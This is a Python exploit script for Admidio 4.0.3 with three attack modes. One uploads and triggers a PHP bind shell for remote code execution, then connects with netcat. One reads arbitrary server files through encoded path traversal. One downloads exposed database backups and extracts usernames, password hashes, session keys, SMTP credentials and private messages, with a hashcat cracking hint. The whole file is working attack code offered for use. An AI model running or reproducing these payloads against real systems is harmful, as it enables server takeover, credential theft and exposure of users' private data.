#!/usr/bin/python3
#-*- coding: utf-8 -*-
# Affects Admidio 4.0.3 (and probably previous version)
# Fixes implemented in 4.0.4

import requests, socket, urllib.request
import sys, gzip, shutil, string
import os, argparse, random, subprocess
from bs4 import BeautifulSoup
from time import sleep
from argparse import RawTextHelpFormatter


class bco:
    WHT = '\033[37m'
    GRN = '\033[92m'
    ENC = '\033[0m'

parser = argparse.ArgumentParser(description="""Admidio 4.0.3 Multi-Exploit Pack 
  eg: python3 poc.py --url http://127.0.0.1/admidio/ --mode rce -u bob -p 'letmein!1!!'

""", formatter_class=RawTextHelpFormatter)
parser.add_argument('--url', dest='URL', help='URL to Admidio web root', required=True)
parser.add_argument('--mode', dest='MODE', help="""Which exploit?
rce : Auto-upload .phar bind shell (Authenticated)
lfi : Local File Inclusion via DB file move (Authenticated)
db  : MySQL Backup DB Juice Extraction (Unauthenticated)
""", required=True)
parser.add_argument('-u', dest='USERNAME', help='Username', required=False)
parser.add_argument('-p', dest='PASSWORD', help='Password', required=False)

args = parser.parse_args()

def main():
  if args.MODE == "db":
    dbjuice()
  elif args.MODE == "rce":
    rce()
  elif args.MODE == "lfi":
    lfi()
  else:
    print("[-] Invalid Mode choice")
    exit(1)

def lfi():
  aSession = login()
  lfia(aSession)

def lfia(aSession):
  print(bco.GRN+"[+] Enter Target File you'd like to read (eg: ../../../../../../../etc/passwd) "+bco.ENC)
  lfiPath = input("   [!] Path: ")
  pathE1 = lfiPath.replace('/', '%252f')
  pathE2 = pathE1.replace('.', '%252e')

  lfiGet = args.URL + "/adm_program/modules/documents-files/documents_files_function.php?mode=6&folder_id=1&name=" + pathE2
  lfiRes = aSession.get(lfiGet, allow_redirects=True)
  lfiChk = aSession.get(args.URL + "adm_program/modules/documents-files/documents_files.php")

  soupL = BeautifulSoup(lfiChk.content, 'html.parser')
  #print(soupL)
  lfiLinks = []
  for lLinks in soupL.findAll('a'):
    if lfiPath in lLinks:
      fLink = lLinks.get('href')
      r = aSession.get(fLink, allow_redirects=True)

      chars = string.ascii_letters
      ranl = "".join(random.choices(chars, k=3))
      lfiDwn = "/tmp/" + ranl + "_admidio.txt"
      open(lfiDwn, 'wb').write(r.content)
      sleep(0.6)
      with open(lfiDwn, 'r') as lout:
        print(lout.read())
        os.remove(lfiDwn)
        lfia(aSession)

  print(bco.GRN+"   [-] File Not Found."+bco.ENC)
  lfia(aSession)

# DB
def dbjuice():
  if args.USERNAME is None or args.PASSWORD is None:
    print(bco.GRN+"[+] DB backups may be leaking with usernames, hashes and more..."+bco.ENC)
    Question = input("    Attempt to automatically download leaked DB's and extract juice? [Y/N]: ")
    if Question == ("Y"):
      backupURI = args.URL + "adm_my_files/backup/"
      print (bco.GRN+"[+] Checking if backup directory is indexed: " + backupURI + bco.ENC)  

      backupGet = requests.get(backupURI)
      if backupGet.status_code != 200:
        print(bco.GRN+"[-] URI does not seem to allow Indexing!"+bco.ENC)
        print("    If you'd like to brute force use this convention:")
        print("       ex: db_backup.2021-01-14.085525.sql.gz ")
        exit(1)
      else:
        print("    Success - backups page is indexed")
        soupB = BeautifulSoup(backupGet.content, 'html.parser')
        
        if "db_backup" in soupB is None:
            print(bco.GRN+'[-] No DB Backup files discovered.'+bco.ENC)
            exit(1)

        print(bco.GRN+"[+] Collecting Database Backup Files"+bco.ENC)
        # Find sql.gz files
        dbs = []
        for aLinks in soupB.findAll('a'):
            chkLink = aLinks.get('href')
            
            if 'db_backup' in chkLink :

              url = backupURI + chkLink
              dbs.append(chkLink)
              urllib.request.urlretrieve(url, '/tmp/' + chkLink)
              print("    Downloaded to /tmp/" + chkLink )

        print(bco.GRN+"[+] Extracted only the most recent sql.gz: "+bco.ENC)
        allGz = []
        for file in os.listdir("/tmp/"):
          if file.endswith(".sql.gz"):
            allGz.append(file)
        newestGz = sorted(allGz, reverse=True)[0]

        gPath = "/tmp/" + newestGz
        juice = "/tmp/juice.sql"
        with gzip.open(gPath , 'rb') as infile:
          with open(juice, 'wb') as outfile:
            for line in infile:
                outfile.write(line)
        #print(" ")
        print("                __")
        print("               /.-")
        print("       ______ //")
        print("      /______'/|")
        print("      [ DB    ]|")
        print("      [ Juice ]|")
        print("      [   :'  ]/")
        print("      '-------'")
        print(" ")                                                                     
        print(bco.GRN+"[+] Usernames and Password Hashes: "+bco.ENC)
        word_exists = os.system("cat " + juice  + " |grep usr_valid |grep -v \", 'System',\" |cut -d ' ' -f23-24 |tr -d \"'\" |tr -d ',' |awk 'NF' |sed -e 's/^/     /'")
        # pw strength
        print("     [+] Password strength requirment: (Good luck if it's GT 0)")
        word_exists = os.system("cat " + juice  + " |grep password_min_strength |\cut -d \"'\" -f2-4 |tr -d \"'\" |tr -d ',' |awk 'NF' |sed -e 's/^/         /'")
        print("     [!] Hashes are in bcrypt and can be cracked with hashcat - eg:")
        print("     C:\> hashcat.exe -m 3200 -a 3 passwd_hashes.txt wordlist.txt")
      
        print(bco.GRN+"[+] Session data (session key & date created): "+bco.ENC)
        ses_exists = os.system("cat " + juice + " |grep adm_sessions |cut -d ' ' -f17-18|tr -d \"'\" |tr -d ',' |awk 'NF' | sed -e 's/^/     /' 2> /dev/null ")

        print("     [!] Long shot...if Sessions exist is the date current?")
      
        print(bco.GRN+"[+] SMTP Mail info from DB: "+bco.ENC)
        mailHost = os.system("cat " + juice + " |grep mail_smtp_host |cut -d \"'\" -f2-4 |tr -d \"'\" |tr -d ',' |awk 'NF' | sed -e 's/^/     /' 2> /dev/null")

        mailUser = os.system("cat " + juice+ " |grep mail_smtp_user |cut -d \"'\" -f2-4 |tr -d \"'\" |tr -d ',' |awk 'NF' | sed -e 's/^/     /' 2> /dev/null")

        mailPass = os.system("cat " + juice + " |grep mail_smtp_password |cut -d \"'\" -f2-4 |tr -d \"'\" |tr -d ',' |awk 'NF' | sed -e 's/^/     /' 2> /dev/null")

        print(bco.GRN+"[+] Private Messages: "+bco.ENC)
        word_exists = os.system("cat " + juice + " |grep adm_messages_content |cut -d \"'\" -f2-3 |tr -d \"'\" |tr -d ',' |awk 'NF' | sed -e 's/^/     /' 2> /dev/null")

        print(bco.GRN+"--------------------DONE------------------------"+bco.ENC)
        exit(1)
    else:
      print ("Exiting.")
      exit(1)

# Login
def login():
  if args.USERNAME is None or args.PASSWORD is None:
    print(bco.GRN+"[-] Username and Password required!"+bco.ENC)
    exit(1)

  headers = {
      "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0",
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.5",
      "Accept-Encoding": "gzip, deflate",
  }

  aSession = requests.Session() 

  loginCook= args.URL + "adm_program/system/login.php"
  res = aSession.get(loginCook)
  cookies = dict(res.cookies)
  loginUri = args.URL + "adm_program/system/login_check.php"
  print(bco.GRN+"[+] Attempting to Login"+bco.ENC)

  postData = { "plg_usr_login_name" : args.USERNAME, "plg_usr_password": args.PASSWORD, "next_page" : "" }
  loginReq = aSession.post(loginUri, data = postData, allow_redirects=True, headers=headers, cookies=cookies)

  #soupB = BeautifulSoup(loginReq.content, 'html.parser')
  #print(soupB )

  incorrect = b'incorrect'
  errorRes = b'Log-in error'

  if incorrect in loginReq.content or errorRes in loginReq.content :
    print("    [-] Login: Failed")
    exit(1)
  else:
    print("    [!] Login: Successful")
    sleep(0.4)
    return aSession

# ----------------------
# ---UPLOAD PHAR SHELL--
# ----------------------
def rce():
  aSession = login()
  pharside(aSession)

def pharside(aSession):

  print(bco.GRN+"[+] Attempting to Upload PHAR shell"+bco.ENC)
  ncExist = shutil.which("nc")
  curlExist = shutil.which("curl")
  if curlExist is None or ncExist is None:
    print(bco.GRN+"[-] Netcat and curl are needed. Exiting."+bco.ENC)
    exit(1)

  # msfvenom -p php/bind_php lport=4444
  bindShell=""""
      <?php @error_reporting(0);@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);$FQbi=@ini_get('disable_functions');if(!empty($FQbi)){$FQbi=preg_replace('/[, ]+/',',',$FQbi);$FQbi=explode(',',$FQbi);$FQbi=array_map('trim',$FQbi);}else{$FQbi=array();}$port=4444;$scl='socket_create_listen';if(is_callable($scl)&&!in_array($scl,$FQbi)){$sock=@$scl($port);}else{$sock=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);$ret=@socket_bind($sock,0,$port);$ret=@socket_listen($sock,5);}$msgsock=@socket_accept($sock);@socket_close($sock);while(FALSE!==@socket_select($r=array($msgsock),$w=NULL,$e=NULL,NULL)){$o='';$c=@socket_read($msgsock,2048,PHP_NORMAL_READ);if(FALSE===$c){break;}if(substr($c,0,3)=='cd '){chdir(substr($c,3,-1));}else if(substr($c,0,4)=='quit'||substr($c,0,4)=='exit'){break;}else{if(FALSE!==strpos(strtolower(PHP_OS),'win')){$c=$c." 2>&1\n";}$KNaLf='is_callable';$paZj='in_array';if($KNaLf('passthru')and!$paZj('passthru',$FQbi)){ob_start();passthru($c);$o=ob_get_contents();ob_end_clean();}else if($KNaLf('system')and!$paZj('system',$FQbi)){ob_start();system($c);$o=ob_get_contents();ob_end_clean();}else if($KNaLf('exec')and!$paZj('exec',$FQbi)){$o=array();exec($c,$o);$o=join(chr(10),$o).chr(10);}else if($KNaLf('popen')and!$paZj('popen',$FQbi)){$fp=popen($c,'r');$o=NULL;if(is_resource($fp)){while(!feof($fp)){$o.=fread($fp,1024);}}@pclose($fp);}else if($KNaLf('shell_exec')and!$paZj('shell_exec',$FQbi)){$o=shell_exec($c);}else if($KNaLf('proc_open')and!$paZj('proc_open',$FQbi)){$handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);$o=NULL;while(!feof($pipes[1])){$o.=fread($pipes[1],1024);}@proc_close($handle);}else{$o=0;}}@socket_write($msgsock,$o,strlen($o));}@socket_close($msgsock); ?>
  """

  # UPLOAD
  # Need IP for later
  hname = args.URL.split('/')[2]
  ipres = socket.gethostbyname(hname)

  chars = string.ascii_letters
  anam = "".join(random.choices(chars, k=3))
  shellName = anam + ".phar"

  uploadUri = args.URL + "adm_program/system/file_upload.php?module=documents_files&mode=upload_files&id=1"

  #upSend = aSession.post(uploadUri, files = {"files[]": filesBang}) # this works for phar's on disk
  upSend = aSession.post(uploadUri, files = {'files[]': (shellName, bindShell)})

  notAllowed = b'not allowed'

  if notAllowed in upSend.content:
    print("    [-] Upload Failed!")
    exit(1)
  else:
    print("    [!] Upload successful")
    print("        File: " + shellName)
    # Extract unique company name from cookie..needed for uploaded files URI
    coName = str(aSession.cookies)
    cuts = coName.split('_')[1]
    sleep(0.4)

    print(bco.GRN+'[+] Sending cURL Request to Trigger Payload'+bco.ENC)
    shellPath = args.URL + 'adm_my_files/documents_' + cuts.lower() + "/" + shellName

    curlCmd = curlExist + ' -X GET ' + shellPath + ' &'
    triggerCmd = os.system(curlCmd)
    print('    ', end=' ')
    ll = ['*', '.','0','o','.','-','~','*','>',',','*','^',' ',' /','+','~','x']
    for i in range(12):
      print(random.choice(ll), sep=' ', end=' ', flush=True); sleep(0.2)

    print('')
    print(bco.GRN+"[+] Connecting to PHAR Bind Shell..."+bco.ENC)
    sleep(1)
    subprocess.run([ncExist, '-nv', ipres, '4444'])


if __name__ == "__main__":
    main()
